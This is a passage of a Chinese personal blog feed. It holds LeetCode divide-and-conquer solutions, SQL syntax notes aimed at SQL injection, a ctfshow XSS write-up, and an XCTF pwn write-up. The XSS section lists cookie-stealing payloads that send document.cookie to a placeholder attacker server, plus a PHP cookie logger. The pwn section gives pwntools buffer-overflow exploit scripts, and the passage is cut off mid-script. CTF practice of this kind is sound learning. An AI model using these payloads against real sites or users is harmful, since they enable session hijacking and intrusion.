class="comment">//计算后半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; v2 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>() + i + <span class="number">1</span>,expression.<span class="built_in">end</span>()));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//二重循环，类似笛卡尔积</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;v1.<span class="built_in">size</span>();i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;v2.<span class="built_in">size</span>();j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    v3.<span class="built_in">push_back</span>(<span class="built_in">cal</span>(v1[i],v2[j],op));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不存在运算符，即到达终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(op_flag == <span class="number">0</span>)</span><br><span class="line">            v3.<span class="built_in">push_back</span>(<span class="built_in">stoi</span>(expression));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
        <category>分治</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-分治-最接近原点的K个点</title>
    <url>/2022/03/27/blog0007-leetcode-%E5%88%86%E6%B2%BB-%E6%9C%80%E6%8E%A5%E8%BF%91%E5%8E%9F%E7%82%B9%E7%9A%84K%E4%B8%AA%E7%82%B9/</url>
    <content><![CDATA[<h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给定一个数组 points ，其中 points[i] = [xi, yi] 表示 X-Y 平面上的一个点，并且是一个整数 k ，返回离原点 (0,0) 最近的 k 个点。</p>
<p>这里，平面上两点之间的距离是 欧几里德距离（ √(x1 - x2)2 + (y1 - y2)2 ）。</p>
<p>你可以按 <strong>任何顺序</strong> 返回答案。除了点坐标的顺序之外，答案 确保 是 <strong>唯一</strong> 的。</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：points = [[1,3],[-2,2]], k = 1</span><br><span class="line">输出：[[-2,2]]</span><br><span class="line">解释： </span><br><span class="line">(1, 3) 和原点之间的距离为 sqrt(10)，</span><br><span class="line">(-2, 2) 和原点之间的距离为 sqrt(8)，</span><br><span class="line">由于 sqrt(8) &lt; sqrt(10)，(-2, 2) 离原点更近。</span><br><span class="line">我们只需要距离原点最近的 K = 1 个点，所以答案就是 [[-2,2]]。</span><br><span class="line">示例 2：</span><br><span class="line"></span><br><span class="line">输入：points = [[3,3],[5,-1],[-2,4]], k = 2</span><br><span class="line">输出：[[3,3],[-2,4]]</span><br><span class="line">（答案 [[-2,4],[3,3]] 也会被接受。）</span><br></pre></td></tr></table></figure>
<h2 id="二、我的思路"><a href="#二、我的思路" class="headerlink" title="二、我的思路"></a>二、我的思路</h2><h4 id="思路一：排序"><a href="#思路一：排序" class="headerlink" title="思路一：排序"></a>思路一：排序</h4><p>显然是非常直观的思路，我们可以直接排序数组，返回前K个数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">kClosest</span>(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        vector&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;points.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;(i ,points[i][<span class="number">0</span>] * points[i][<span class="number">0</span>] + points[i][<span class="number">1</span>] * points[i][<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(res.<span class="built_in">begin</span>(),res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; (res.<span class="built_in">begin</span>(),res.<span class="built_in">begin</span>() + k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h4><p>我们这次主要是学习分治的思想，因此我们可以考虑使用快排的思路（其实algorithm的sort也是快排），当我们完成一次快排，我们可以将数组分为两个部分，因此我们可以借此不断将数组分割来找到第K个数。</p>
<p>代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; dist;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points,<span class="keyword">int</span> beg,<span class="keyword">int</span> end)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = beg;</span><br><span class="line">        <span class="keyword">int</span> j = end;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; p = points[beg];</span><br><span class="line">        <span class="keyword">int</span> p_dist = dist[beg];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; dist[j] &gt; p_dist)</span><br><span class="line">            &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">            &#123;</span><br><span class="line">                points[i] = points[j];</span><br><span class="line">                dist[i] = dist[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; dist[i] &lt;= p_dist)</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">            &#123;</span><br><span class="line">                points[j] = points[i];</span><br><span class="line">                dist[j] = dist[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        points[j] = p;</span><br><span class="line">        dist[j] = p_dist;</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">select_random</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points,<span class="keyword">int</span> left,<span class="keyword">int</span> right,<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot = <span class="built_in">partition</span>(points, left, right);</span><br><span class="line">        <span class="keyword">if</span> (pivot == k)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pivot &lt; k)</span><br><span class="line">        &#123;	<span class="comment">// 注意此时我们使用的是数组的引用，因此我们的K未发生变化</span></span><br><span class="line">            <span class="built_in">select_random</span>(points, pivot + <span class="number">1</span>, right, k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">select_random</span>(points, left, pivot - <span class="number">1</span>, k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">kClosest</span>(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; points, <span class="keyword">int</span> k) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tar = k - <span class="number">1</span>;</span><br><span class="line">        dist.<span class="built_in">resize</span>(points.<span class="built_in">size</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; points.<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dist[i] = (points[i][<span class="number">0</span>] * points[i][<span class="number">0</span>] + points[i][<span class="number">1</span>] * points[i][<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">select_random</span>(points, <span class="number">0</span>, points.<span class="built_in">size</span>() - <span class="number">1</span>, tar);</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">res</span>(points.<span class="built_in">begin</span>(), points.<span class="built_in">begin</span>() + k);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
        <category>分治</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL语法笔记</title>
    <url>/2022/03/31/blog0010-SQL%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="零、基础知识"><a href="#零、基础知识" class="headerlink" title="零、基础知识"></a>零、基础知识</h2><p>1、<strong>数据类型</strong></p>
<p>首先我们要了解SQL语句的基本数据类型。</p>
<p>具体的知识我们可以参考w3cschools : </p>
<span id="more"></span>
<p><strong>2、注释</strong></p>
<p>SQL注入中我们常常需要借助注释的力量。</p>
<p>常见的注释方法有:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">/<em> </em>/</th>
<th style="text-align:center">多行注释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">—</td>
<td style="text-align:center">行末注释</td>
</tr>
<tr>
<td style="text-align:center">#</td>
<td style="text-align:center">行末注释（mysql独有的注释符号）</td>
</tr>
</tbody>
</table>
</div>
<p><strong>3、表的基本操作</strong></p>
<p>表的操作有增删查改。</p>
<h2 id="一、数据查询"><a href="#一、数据查询" class="headerlink" title="一、数据查询"></a>一、数据查询</h2><p>不论是何种数据库，设计的意义都是为了方便查询，这也是SQL语法标准的意义所在。对于SQL注入而言，我们主要关心的就是数据的查询。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* 常见的格式如下 */</span><br><span class="line">select * from &#123;table_name&#125; where &#123;limit&#125;</span><br></pre></td></tr></table></figure>
<p>重要关键词如下：</p>
<p><code>DISTINCT</code>    : 将返回结果去重</p>
<p><code>in</code>                 ：SQL注入中可以替代<code>=</code>使用，bypass的点</p>
<p><code>比较运算符</code>   ：SQL语法中，字符串也可以进行比较（从左向右，根据ASCII码比较）    </p>
<p><code>LIKE</code>            ：字段条件匹配</p>
<p>​                          通配符：%  —&gt;    匹配任意字符  </p>
<p>​                                          _    —&gt;    匹配任意一位字符</p>
<p><code>order by</code>    ：排序关键字</p>
<ul>
<li>order by (id/列的索引)</li>
<li>（默认升序， DESC 表示降序）</li>
</ul>
<p><code>limit</code>            :  限制筛选输出的行数，在SQL server中，使用top 来代替</p>
<p><code>alias</code>            :  重命名，常用作as，也可以空格代替</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">as</span> whistleh <span class="keyword">from</span> table_user <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> id whistleh	<span class="keyword">from</span> table_user <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)s</span><br></pre></td></tr></table></figure>
<p><code>union</code>            :    联合查询，默认会对结果去重</p>
<p><code>GROUP BY</code>    :     对查询结果建立分组表，和<code>HAVING</code>搭配做进一步的条件筛查</p>
<p><code>join</code>            :    连接关键字，主要用于多表查询</p>
<ul>
<li>inner join，内连接，主要是在做交集</li>
<li>left join，左连接</li>
<li>right join，右连接</li>
</ul>
<p><code>all</code>        ：    条件表达式</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="keyword">all</span>(<span class="keyword">select</span> id <span class="keyword">from</span> user_1);</span><br></pre></td></tr></table></figure>
<p><code>any</code>        :    使用参照<code>all</code></p>
<h2 id="二、函数使用"><a href="#二、函数使用" class="headerlink" title="二、函数使用"></a>二、函数使用</h2><p>SQL语法自带一定的函数，当然在mysql,oracle等等具体的SQL语言中，也会有特定的函数。</p>
<p><code>min</code>,<code>max</code>,<code>sum</code>,<code>count</code>,<code>avg</code>等都是常见的函数</p>
<p><code>database</code>    :    输出当前数据库</p>
<p><code>user</code>            :    输出当前用户        </p>
<p><code>sleep</code>    :    常用在时间盲注当中</p>
<p><code>updatexml</code>    :    可以用在报错注入，测试后端是否存在注入点</p>
<p><code>contact</code>        :    连接字符串，支持ASCII编码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> contact(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>,@<span class="variable">@datadir</span>);</span><br></pre></td></tr></table></figure>
<p><code>exist</code>    ：判断是否有值，这给了我们盲注爆破的机会</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><code>ASCII</code>    :     返回传入字符串的首字母的ASCII的值</p>
<p><code>substring</code>    :    按照要求返回子串，两个参数：起始位置（下标从1开始计算），截取的长度</p>
<h2 id="三、常量"><a href="#三、常量" class="headerlink" title="三、常量"></a>三、常量</h2><p><code>@@datadir</code>    :    数据库的系统目录</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@datadir</span>;</span><br></pre></td></tr></table></figure>
<p><code>@@character_set_database</code>     :    字符集</p>
<p><code>@@hostname</code>    :    计算机名</p>
<p><code>@@version_compile_os</code>        :    操作系统版本</p>
<p><code>@@basedir</code>        ：    <code>mysql</code>的路径</p>
<p><code>mysql.user</code>    ：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">User</span>,Password <span class="keyword">from</span> mysql.user;</span><br></pre></td></tr></table></figure>
<h2 id="四、数据库操作"><a href="#四、数据库操作" class="headerlink" title="四、数据库操作"></a>四、数据库操作</h2>]]></content>
      <categories>
        <category>数据库</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>sql</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-xss-wp</title>
    <url>/2021/11/23/blog0004-ctfshow-xss-wp/</url>
    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
<p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p>
<p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p>
<span id="more"></span>
<p>反射型常见trick：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python for temporary site</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server &#123;port&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP for store the http request</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$log</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]);</span><br><span class="line">	fclose(<span class="variable">$log</span>);</span><br><span class="line">	<span class="comment">//var_dump(scandir(&quot;.&quot;));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span></span><br><span class="line"><span class="comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span></span><br><span class="line"><span class="comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试试(find / -name &quot;cookie.txt&quot;)</span></span><br></pre></td></tr></table></figure>
<h2 id="反射型（Web316-Web326"><a href="#反射型（Web316-Web326" class="headerlink" title="反射型（Web316 - Web326)"></a>反射型（Web316 - Web326)</h2><p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p>
<p>不过会有各种过滤</p>
<p>附上payload，一般都试试，如果过不去了可以试试其他banfa</p>
<p>xss平台：<a href="https://xss.pt/">https://xss.pt/</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先是经典的img</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">	img.src = <span class="string">&quot;http://your-domain:port/&quot;</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//location.href系列</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://your-domain:port/?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//iframe标签</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//input标签</span></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">    </span><br><span class="line">//svg标签</span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">    </span><br><span class="line">//body标签</span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">//img标签</span><br><span class="line">&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;</span><br><span class="line">&lt;img src=&#x27;x&#x27; onclick=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;</span><br></pre></td></tr></table></figure>
<p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
<p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h3 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h3><p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p>
<p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p>
<p>顺利搞到管理员的cookie</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe	onload=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<h3 id="Web-329"><a href="#Web-329" class="headerlink" title="Web 329"></a>Web 329</h3>]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>xss</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>ctfshow</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn-xctf-新手区wp</title>
    <url>/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
    <content><![CDATA[<h2 id="一、Level-2"><a href="#一、Level-2" class="headerlink" title="一、Level_2"></a>一、Level_2</h2><p>pwn到手第一步，先玩一玩看看.</p>
<span id="more"></span>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png" alt=""></p>
<p>简单的输入提示，基本上获得不了什么信息。</p>
<p>pwn到手第二步，反手来一个checksec看看一些基本信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call  system 和 read，这给了我们布栈的空间。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804844b &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804844c &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x0804844e &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">0x08048454 &lt;+9&gt;:	sub    esp,0xc</span><br><span class="line">0x08048457 &lt;+12&gt;:	push   0x8048540</span><br><span class="line">0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;</span><br><span class="line">0x08048461 &lt;+22&gt;:	add    esp,0x10</span><br><span class="line">0x08048464 &lt;+25&gt;:	sub    esp,0x4</span><br><span class="line">0x08048467 &lt;+28&gt;:	push   0x100</span><br><span class="line">0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点</span><br><span class="line">0x08048472 &lt;+39&gt;:	push   eax</span><br><span class="line">0x08048473 &lt;+40&gt;:	push   0x0</span><br><span class="line">0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;</span><br><span class="line">0x0804847a &lt;+47&gt;:	add    esp,0x10</span><br><span class="line">0x0804847d &lt;+50&gt;:	nop</span><br><span class="line">0x0804847e &lt;+51&gt;:	leave  </span><br><span class="line">0x0804847f &lt;+52&gt;:	ret  </span><br></pre></td></tr></table></figure>
<p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 “/bin/sh”的地址。</p>
<p>当ret时，我们回到了call   0x8048320 <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#115;&#x79;&#115;&#116;&#101;&#109;&#64;&#112;&#x6c;&#x74;">&#115;&#x79;&#115;&#116;&#101;&#109;&#64;&#112;&#x6c;&#x74;</a>，此时esp由于pop eip的效果，此时内部存放着”/bin/sh”的地址，这也顺利地完成了system函数的参数布置。</p>
<p>Python的exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 111.200.241.244:65392</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;65392&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./xctf_2&quot;)</span></span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Input:\n&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x804845c</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line">fill_num = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="二、guess-num"><a href="#二、guess-num" class="headerlink" title="二、guess_num"></a>二、guess_num</h2><p>这道题有点意思，丢到ida里面就可以发现这是一个猜随机数的题。</p>
<p>这里其实是之前web里面遇到的一个点，我们直接把seed[0]给覆盖了，那么随机数的产生就是确定的。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_2.png" alt=""></p>
<p>exp.py如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;60037&quot;</span>)</span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Your name:&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x1</span>)</span><br><span class="line">num_list = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam, payload)</span><br><span class="line"></span><br><span class="line">dam_1 = <span class="string">&quot;Please input your guess number:&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.sendlineafter(dam_1,<span class="built_in">str</span>(num_list[i]).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="三、int-overflow（整数溢出）"><a href="#三、int-overflow（整数溢出）" class="headerlink" title="三、int_overflow（整数溢出）"></a>三、int_overflow（整数溢出）</h2><p>整数溢出这个就没什么好说的，在高程作业中做太多了。</p>
<p>重点是来看看我们要如何利用这个漏洞来实现攻击的，shift+F12，我们可以发现源程序中存在get_shell()的后门，并且没开PIE，这就给了我们re2text的利用空间。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_3.png" alt=""></p>
<p>很显然，我们可以尝试利用dest的空间来修改ret的地址，但是我们要如何进入这个分支呢？</p>
<p>注意到，v3是unsigned __int8 类型，当int  strlen(char *)赋值时，会发生高位截断，所以我们只需要写入一个长度超过256的字符串给s，就能实现栈空间数据的修改。</p>
<p>补充：我们可以考虑在其他函数中read字符串的时候实现re2text，但是这道题在输入时限制的read的长度，所以我们只能考虑利用整数溢出来实现。</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./xctf_4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(pwnfile)</span></span><br><span class="line">io=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;54657&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_func_name = <span class="string">&quot;what_is_this&quot;</span></span><br><span class="line">leak_func_addr = elf.symbols[leak_func_name]</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x14</span> + <span class="number">0x04</span>) * <span class="string">b&#x27;a&#x27;</span> + p32(leak_func_addr) + (<span class="number">260</span>-<span class="number">0x14</span>-<span class="number">0x04</span>-<span class="number">0x04</span>) * <span class="string">b&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">choice = <span class="string">&quot;1&quot;</span></span><br><span class="line">dam_0 = <span class="string">&quot;Your choice:&quot;</span></span><br><span class="line">io.sendlineafter(dam_0, choice)</span><br><span class="line"></span><br><span class="line">name = <span 